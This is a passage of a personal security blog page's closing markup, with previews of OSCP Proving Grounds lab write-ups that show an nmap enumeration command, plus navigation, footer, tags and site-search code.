aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/oscp-pg-set6/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Potato, PyExp, Sar, Seppukku</h4><div class="text-muted"><p>Potato Enumeration Machine IP → 192.168.53.101 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set5/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</h4><div class="text-muted"><p>NoName Enumeration Machine IP → 192.168.225.15 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15 OS Detection → os_info Port Service Other de...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set4/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Katana, Lampiao, Loly, Monitoring</h4><div class="text-muted"><p>Katana Enumeration Machine IP → 192.168.51.83 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83 OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/oscp-pg-set7/" class="btn btn-outline-primary" aria-label="Older" ><p>OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide</p></a> <a href="/blog/posts/homelab-discord-reddit/" class="btn btn-outline-primary" aria-label="Newer" ><p>Reddit Feeds via Discord WebHooks</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.2.4" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
